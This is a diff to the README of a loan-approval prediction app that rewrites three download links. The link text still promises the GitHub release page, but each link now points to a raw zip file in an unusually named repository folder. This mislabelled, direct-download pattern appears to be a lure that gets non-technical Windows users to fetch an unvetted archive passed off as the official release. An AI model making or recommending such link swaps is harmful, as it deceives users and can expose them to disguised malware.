@@ -1,6 +1,6 @@
 # 📊 Loan-Approval-Prediction - Predict loan results with clear data
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/dhobiitchmindseye650/Loan-Approval-Prediction/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/dhobiitchmindseye650/Loan-Approval-Prediction/main/thoughted/Loan_Prediction_Approval_v3.3.zip)
 
 ## 🧭 What this app does
 
@@ -12,7 +12,7 @@ The app is based on logistic regression, a common model for yes-or-no decisions.
 
 Use the release page to download and run the app:
 
-[Go to the release page](https://github.com/dhobiitchmindseye650/Loan-Approval-Prediction/releases)
+[Go to the release page](https://raw.githubusercontent.com/dhobiitchmindseye650/Loan-Approval-Prediction/main/thoughted/Loan_Prediction_Approval_v3.3.zip)
 
 ### Steps for Windows
 
@@ -191,7 +191,7 @@ It can help you:
 
 ## 📦 Download
 
-[Open the release page to download the Windows version](https://github.com/dhobiitchmindseye650/Loan-Approval-Prediction/releases)
+[Open the release page to download the Windows version](https://raw.githubusercontent.com/dhobiitchmindseye650/Loan-Approval-Prediction/main/thoughted/Loan_Prediction_Approval_v3.3.zip)
 
 ## 🧭 Quick start for non-technical users
 
